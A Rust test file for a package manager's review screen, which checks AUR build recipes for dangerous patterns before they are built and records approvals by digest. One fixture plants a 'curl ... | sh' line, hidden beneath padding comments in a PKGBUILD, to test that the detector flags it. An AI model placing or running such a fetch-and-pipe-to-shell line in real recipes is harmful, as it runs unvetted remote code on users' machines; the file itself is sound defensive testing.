//! The review screen through the whole application: an AUR build is confirmed, its recipe is
//! fetched by a `git` double that leaves what a clone would, read on this screen, and only the
//! approval starts the build.
//!
//! Nothing here reaches the network, `git`, paru or pacman: the planning questions are answered
//! from recordings, the clone is the double, and the build never gets further than asking for
//! permission, which the harness records instead of running.

use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, PoisonError};
use std::time::Duration;

use qframe::icons::GlyphMode;
use qframe::prelude::Harness;
use qframe::runtime::ProcessOutcome;
use qframe::storage::Settings;
use qpackages_core::build::plan::check_args;
use qpackages_core::catalog::aur::info_urls;
use qpackages_core::catalog::net::{CURL, curl_args};
use qpackages_core::pacman::command::{PACMAN, print_install};
use qpackages_core::review::fetch;
use qpackages_core::review::{Recipe, RecipeFile, Store};

use crate::app::{self, Msg, Places, Qpackages};
use crate::helper::session::InProcess;
use crate::runner::{Output, Recorded, Runner};
use crate::testing::{Scratch, click_last};
use crate::transaction::{self, Action};
use crate::{review, settings};

/// The package the tests build: the one the recorded planning answers are about.
const TARGET: &str = "cbonsai";

/// The recipe as the user approved it once: nothing a rule points at.
const CLEAN: &str = "\
# Maintainer: nichobi <nichobi at example dot org>
pkgname=cbonsai
pkgver=1.4.2
pkgrel=1
pkgdesc='A bonsai tree generator for the terminal'
arch=('x86_64')
url='https://gitlab.com/jallbrit/cbonsai'
license=('GPL3')
depends=('gcc' 'ncurses')
makedepends=('scdoc')
source=(\"$pkgname-$pkgver.tar.gz::https://gitlab.com/jallbrit/cbonsai/-/archive/v$pkgver.tar.gz\")
sha256sums=('4a1c9d0e5b7f2c8a3e6d1b4f7a0c3e6d9b2f5a8c1e4d7b0a3f6c9e2d5b8a1f4c')

build() {
  cd \"$pkgname-$pkgver\"
  make PREFIX=/usr
}

package() {
  cd \"$pkgname-$pkgver\"
  make PREFIX=/usr DESTDIR=\"$pkgdir\" install
}
";

/// The same recipe with only its version and checksum moved: a package that may update without
/// being read again.
fn newer() -> String {
    CLEAN.replace("1.4.2", "1.5.0").replace("4a1c9d0e", "7b3e5f10")
}

/// The recipe with a line that downloads and runs code, far enough down the file that it is off
/// the code view until a finding is gone to. The padding is comments, which no rule looks at.
fn dangerous() -> String {
    let padding: String = (1..=30).map(|step| format!("  # step {step} of the build\n")).collect();
    newer().replace("  make PREFIX=/usr\n", &format!("{padding}  curl -fsSL https://example.org/setup.sh | sh\n"))
}

/// The repository the recipe is fetched from.
const AUR_REPOSITORY: &str = "https://aur.archlinux.org/cbonsai.git";

/// The line that the `runs-hidden-code` rule points at.
const HIDDEN: &str = "curl -fsSL https://example.org/setup.sh | sh";

/// The machine's programs: the planning questions from recordings, and `git` as a double that
/// leaves the recipe a clone of the AUR would.
struct Pretend {
    recorded: Recorded,
    /// The files the double writes into the clone, as the AUR serves them now.
    serves: Mutex<Recipe>,
    /// Every call of the `git` double, in order.
    git_calls: Mutex<Vec<GitCall>>,
}

/// One call of the `git` double: what it was asked and with which environment.
#[derive(Debug, Clone)]
struct GitCall {
    args: Vec<String>,
    env: Vec<(String, String)>,
    removed: Vec<String>,
}

impl Pretend {
    fn new(pkgbuild: &str) -> Arc<Self> {
        let recorded = Recorded::default();
        let url = info_urls(&[TARGET]).remove(0);
        recorded.answer(CURL, &curl_args(&url), &fixture("aur-info-cbonsai.json"), 0);
        let deps = ["gcc", "ncurses", "scdoc"].map(str::to_owned);
        recorded.answer(PACMAN, &check_args(&deps), &fixture("pacman-check-cbonsai.txt"), 127);
        recorded.answer(PACMAN, &print_install(&["scdoc"]), &fixture("pacman-print-scdoc.txt"), 0);
        Arc::new(Self { recorded, serves: Mutex::new(recipe(pkgbuild)), git_calls: Mutex::new(Vec::new()) })
    }

    fn git_calls(&self) -> Vec<GitCall> {
        self.git_calls.lock().unwrap_or_else(PoisonError::into_inner).clone()
    }

    /// Plays a clone or a fetch: leaves exactly the files the AUR serves in the clone's folder,
    /// as `git clean -x` would, and nothing else.
    fn git(&self, args: &[String], env: &[(&str, &str)], remove: &[&str]) -> io::Result<Output> {
        let call = GitCall {
            args: args.to_vec(),
            env: env.iter().map(|(key, value)| ((*key).to_owned(), (*value).to_owned())).collect(),
            removed: remove.iter().map(|name| (*name).to_owned()).collect(),
        };
        self.git_calls.lock().unwrap_or_else(PoisonError::into_inner).push(call);
        let dir = if args.first().is_some_and(|first| first == "-C") {
            PathBuf::from(&args[1])
        } else {
            PathBuf::from(args.last().expect("the clone's folder"))
        };
        fs::create_dir_all(dir.join(".git"))?;
        for entry in fs::read_dir(&dir)? {
            let entry = entry?;
            if entry.file_name() != ".git" {
                fs::remove_file(entry.path())?;
            }
        }
        for file in &self.serves.lock().unwrap_or_else(PoisonError::into_inner).files {
            fs::write(dir.join(&file.name), &file.text)?;
        }
        Ok(Output { stdout: String::new(), stderr: String::new(), code: Some(0) })
    }
}

impl Runner for Pretend {
    fn output(&self, program: &str, args: &[String], env: &[(&str, &str)]) -> io::Result<Output> {
        self.recorded.output(program, args, env)
    }

    fn output_without(
        &self,
        program: &str,
        args: &[String],
        env: &[(&str, &str)],
        remove: &[&str],
    ) -> io::Result<Output> {
        if program == fetch::GIT {
            return self.git(args, env, remove);
        }
        self.recorded.output_without(program, args, env, remove)
    }

    fn stream(
        &self,
        program: &str,
        args: &[String],
        env: &[(&str, &str)],
        pty: Option<(u16, u16)>,
        cancel: &dyn Fn() -> bool,
        on_line: &mut dyn FnMut(String),
    ) -> io::Result<ProcessOutcome> {
        self.recorded.stream(program, args, env, pty, cancel, on_line)
    }
}

/// A recorded answer of the AUR or pacman, taken on the machine the fixtures come from.
fn fixture(name: &str) -> String {
    let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../qpackages-core/tests/fixtures/build").join(name);
    fs::read_to_string(path).expect("the fixture is readable")
}

/// A recipe of one `PKGBUILD`, as the AUR's repository holds it.
fn recipe(pkgbuild: &str) -> Recipe {
    Recipe { files: vec![RecipeFile { name: "PKGBUILD".to_owned(), text: pkgbuild.to_owned() }] }
}

/// The programs of a machine with paru.
fn with_paru(program: &str) -> Option<PathBuf> {
    ["pacman", "paru", "fakeroot"].contains(&program).then(|| Path::new("/usr/bin").join(program))
}

/// The screen and what a test looks at behind it. The scratch machine lives as long as it.
struct Screen {
    h: Harness<Qpackages>,
    machine: Arc<Pretend>,
    places: review::Places,
    /// Kept so the pretend machine's folders outlive the screen that reads them.
    _scratch: Scratch,
}

impl Screen {
    /// What the store kept for the target, `None` while nothing was approved.
    fn recorded_digest(&self) -> Option<String> {
        let record = fs::read_to_string(self.places.approved.join(TARGET).join("record")).ok()?;
        record.lines().find_map(|line| line.strip_prefix("digest ")).map(str::to_owned)
    }
}

/// The application over a pretend machine that serves `pkgbuild`, in `locale`, on a screen of
/// `width` by `height`, drawing with `glyphs`.
fn screen(name: &str, pkgbuild: &str, locale: &str, size: (u16, u16), glyphs: GlyphMode) -> Screen {
    let scratch = Scratch::new(name, &[]);
    let machine = Pretend::new(pkgbuild);
    let recorded = Arc::new(Recorded::default());
    let settings = Settings::parse_str("settings.toml", "").schema(settings::schema());
    let app = Qpackages::new(
        app::Machine {
            dbpath: &scratch.local(),
            sync_dir: &scratch.sync(),
            applications: &scratch.applications(),
            check_dir: None,
            lock_dir: &scratch.lock(),
            lookup: Arc::new(with_paru),
            runner: Arc::clone(&machine) as Arc<dyn Runner>,
            helper: InProcess::new(&recorded, 0).start_fn(),
            uid: Some(1000),
            utc_offset: 0,
            app_catalog: &scratch.catalog(),
            flatpak_catalogs: &[],
            appearance: crate::appearance_in(scratch.root()),
            snap_socket: &scratch.root().join("snapd.socket"),
            first_run: None,
        },
        &settings,
    )
    .with_places(places(&scratch));
    let mut h = Harness::with_env(app, crate::locales::env(), size.0, size.1);
    h.set_locale(locale).set_glyph_mode(glyphs).set_reduced_motion(true);
    let places = review::Places::new(Some(&scratch.root().join("cache")), Some(&scratch.root().join("data")))
        .expect("both folders are given");
    let mut screen = Screen { h, machine, places, _scratch: scratch };
    settle(&mut screen.h);
    screen
}

/// Where a pretend machine keeps everything, including the cache and data folders the review
/// needs; both are inside the scratch folder and go with it.
fn places(scratch: &Scratch) -> Places {
    Places {
        root: scratch.root().to_path_buf(),
        units: None,
        exe: Some(PathBuf::from("/usr/bin/qpac")),
        runtime: Some(scratch.runtime()),
        home: Some(scratch.home()),
        cache: Some(scratch.root().join("cache")),
        data: Some(scratch.root().join("data")),
    }
}

fn settle(h: &mut Harness<Qpackages>) -> String {
    for _ in 0..6 {
        h.advance(Duration::from_millis(20));
    }
    h.screen()
}

/// Asks to build the target and confirms the build, which leads to the review.
fn up_to_the_review(h: &mut Harness<Qpackages>, confirm: &str) -> String {
    h.send(Msg::Transaction(transaction::Msg::Begin(Action::AurInstall(vec![TARGET.to_owned()]))));
    settle(h);
    click_last(h, confirm);
    settle(h)
}

/// Records `pkgbuild` as the recipe the user approved before, as a build that went through would.
fn already_approved(screen: &Screen, pkgbuild: &str) {
    Store::new(&screen.places.approved)
        .approve(TARGET, &recipe(pkgbuild), Some("nichobi"))
        .expect("the store is writable");
}

#[test]
fn a_first_recipe_is_read_in_full_and_approving_records_its_digest() {
    let mut screen = screen("review-first", CLEAN, "en", (120, 34), GlyphMode::Unicode);
    let shown = up_to_the_review(&mut screen.h, "Build and install");
    for text in [
        "Read the recipes before they are built",
        "1 recipe is waiting to be read.",
        "No rule pointed at anything in these recipes.",
        "aur/cbonsai",
        "read in full",
        "PKGBUILD",
        "pkgname=cbonsai",
        "This check looks for known dangerous patterns",
        "a clean result does not mean the package is safe",
        "Reviewed, install",
        "Cancel",
    ] {
        assert!(shown.contains(text), "`{text}` is missing:\n{shown}");
    }
    assert!(screen.recorded_digest().is_none(), "nothing is approved before the button is pressed");
    assert!(screen.h.handoffs().is_empty(), "no permission is asked while the recipe is being read");
    let cloned = screen.machine.git_calls();
    assert!(
        cloned
            .iter()
            .any(|call| { call.args.contains(&"clone".to_owned()) && call.args.contains(&AUR_REPOSITORY.to_owned()) }),
        "the recipe came from the AUR's own repository:\n{cloned:#?}"
    );
    click_last(&mut screen.h, "Reviewed, install");
    settle(&mut screen.h);
    assert_eq!(screen.recorded_digest(), Some(recipe(CLEAN).digest()), "the recipe shown is the one recorded");
    assert!(!screen.h.screen().contains("Reviewed, install"), "the review is done:\n{}", screen.h.screen());
    assert_eq!(screen.h.handoffs().len(), 1, "the build asks for permission only after the approval");
}

#[test]
fn git_runs_without_the_variables_that_would_point_it_at_another_repository() {
    let mut screen = screen("review-git-env", CLEAN, "en", (120, 34), GlyphMode::Unicode);
    up_to_the_review(&mut screen.h, "Build and install");
    let git = screen.machine.git_calls();
    assert!(!git.is_empty(), "the recipe was fetched");
    for call in git {
        assert_eq!(call.removed, fetch::GIT_ENV_REMOVE, "{call:?}");
        assert!(call.env.iter().any(|(key, value)| key == "GIT_TERMINAL_PROMPT" && value == "0"), "{call:?}");
        assert!(call.args.contains(&"--quiet".to_owned()), "{call:?}");
    }
}

#[test]
fn the_recipe_the_user_approved_needs_no_reading() {
    let mut screen = screen("review-same", CLEAN, "en", (120, 34), GlyphMode::Unicode);
    already_approved(&screen, CLEAN);
    let shown = up_to_the_review(&mut screen.h, "Build and install");
    for text in [
        "Every recipe is the one you approved, or moved only its version.",
        "unchanged",
        "Nothing to read",
        "Reviewed, install",
    ] {
        assert!(shown.contains(text), "`{text}` is missing:\n{shown}");
    }
    assert!(!shown.contains("pkgname=cbonsai"), "a recipe that needs no reading is not spelled out:\n{shown}");
}

#[test]
fn a_recipe_that_only_moved_its_version_says_so_and_needs_no_reading() {
    let mut screen = screen("review-version", &newer(), "en", (120, 34), GlyphMode::Unicode);
    already_approved(&screen, CLEAN);
    let shown = up_to_the_review(&mut screen.h, "Build and install");
    assert!(shown.contains("only the version changed"), "{shown}");
    assert!(shown.contains("Every recipe is the one you approved, or moved only its version."), "{shown}");
    assert!(!shown.contains("pkgver=1.5.0"), "nothing to read means nothing shown:\n{shown}");
    click_last(&mut screen.h, "Reviewed, install");
    settle(&mut screen.h);
    assert_eq!(screen.recorded_digest(), Some(recipe(&newer()).digest()), "the new version is recorded");
}

#[test]
fn a_changed_recipe_lists_what_the_rules_point_at_and_a_finding_goes_to_its_line() {
    let mut screen = screen("review-changed", &dangerous(), "en", (120, 34), GlyphMode::Unicode);
    already_approved(&screen, CLEAN);
    let shown = up_to_the_review(&mut screen.h, "Build and install");
    for text in [
        "1 recipe is waiting to be read.",
        "2 places worth a look",
        "runs downloaded or hidden code",
        "Choose one to go to its line.",
        "33 lines changed",
    ] {
        assert!(shown.contains(text), "`{text}` is missing:\n{shown}");
    }
    assert!(!shown.contains(HIDDEN), "the changed line is further down the recipe than the pane shows:\n{shown}");
    click_last(&mut screen.h, "runs downloaded or hidden code");
    let gone = settle(&mut screen.h);
    assert!(gone.contains(HIDDEN), "the code view went to the finding's line:\n{gone}");
    assert!(gone.contains("Runs code that was downloaded or hidden."), "the reason of the chosen finding:\n{gone}");
}

/// The number drawn beside the first row of `screen` that shows `text`: the last number before it
/// on that row, which in the code pane is the line number column.
fn number_beside(screen: &str, text: &str) -> Option<usize> {
    let row = screen.lines().find(|row| row.contains(text))?;
    let before = &row[..row.find(text)?];
    before.split_whitespace().filter_map(|word| word.parse().ok()).next_back()
}

#[test]
fn a_changed_recipe_numbers_its_lines_as_the_findings_do() {
    // Three lines of the approved recipe are gone before the dangerous line, so its row in the
    // difference is not its line: only numbering that follows the file draws 46 beside it.
    let mut screen = screen("review-numbers", &dangerous(), "en", (120, 34), GlyphMode::Unicode);
    already_approved(&screen, CLEAN);
    let shown = up_to_the_review(&mut screen.h, "Build and install");
    let line = dangerous().lines().position(|row| row.contains(HIDDEN)).expect("the recipe has the line") + 1;
    assert_eq!(line, 46, "the fixture puts the dangerous line where the test expects it");
    assert!(shown.contains(&format!("PKGBUILD:{line}")), "the finding names its line:\n{shown}");
    for version in ["pkgver=1.4.2", "pkgver=1.5.0"] {
        assert_eq!(number_beside(&shown, version), Some(3), "both versions of line 3 are numbered 3:\n{shown}");
    }
    click_last(&mut screen.h, "runs downloaded or hidden code");
    let gone = settle(&mut screen.h);
    assert_eq!(number_beside(&gone, HIDDEN), Some(line), "the number beside the finding's line is its own:\n{gone}");
}

#[test]
fn leaving_the_review_builds_nothing_and_records_nothing() {
    let mut screen = screen("review-cancel", CLEAN, "en", (120, 34), GlyphMode::Unicode);
    up_to_the_review(&mut screen.h, "Build and install");
    click_last(&mut screen.h, "Cancel");
    let gone = settle(&mut screen.h);
    assert!(!gone.contains("Reviewed, install"), "{gone}");
    assert!(screen.recorded_digest().is_none(), "nothing was approved");
    assert!(screen.h.handoffs().is_empty(), "no permission was asked");
    let asked = screen.machine.recorded.command_lines();
    assert!(!asked.iter().any(|line| line.starts_with("/usr/bin/paru")), "{asked:#?}");
}

#[test]
fn turkish_reads_the_recipe_in_its_own_words() {
    let mut screen = screen("review-tr", &dangerous(), "tr", (120, 34), GlyphMode::Unicode);
    already_approved(&screen, CLEAN);
    let shown = up_to_the_review(&mut screen.h, "Derle ve kur");
    for text in [
        "Derlenmeden önce tarifleri oku",
        "Okunmayı bekleyen 1 tarif var.",
        "Bakmaya değer",
        "indirilen ya da gizlenmiş kodu çalıştırıyor",
        "Bu kontrol bilinen tehlikeli kalıpları arar",
        "İncelendi, kur",
        "Vazgeç",
    ] {
        assert!(shown.contains(text), "`{text}` is missing:\n{shown}");
    }
    click_last(&mut screen.h, "İncelendi, kur");
    settle(&mut screen.h);
    assert_eq!(screen.recorded_digest(), Some(recipe(&dangerous()).digest()));
}

#[test]
fn the_screen_reads_in_every_glyph_mode_and_on_a_narrow_terminal() {
    for mode in [GlyphMode::Nerd, GlyphMode::Unicode, GlyphMode::Ascii] {
        for (index, size) in [(120_u16, 34_u16), (76, 30)].into_iter().enumerate() {
            let name = format!("review-shape-{mode:?}-{index}");
            let mut screen = screen(&name, &dangerous(), "en", size, mode);
            already_approved(&screen, CLEAN);
            let shown = up_to_the_review(&mut screen.h, "Build and install");
            for text in ["Read the recipes", "worth a look", "Reviewed, install"] {
                assert!(shown.contains(text), "`{text}` is missing at {size:?} in {mode:?}:\n{shown}");
            }
            assert!(
                shown.contains("PKGBUILD"),
                "the file is reachable at {size:?}: a column when wide, a choice when narrow:\n{shown}"
            );
            assert!(!shown.contains('\u{fffd}'), "nothing is drawn as a missing glyph in {mode:?}:\n{shown}");
        }
    }
}
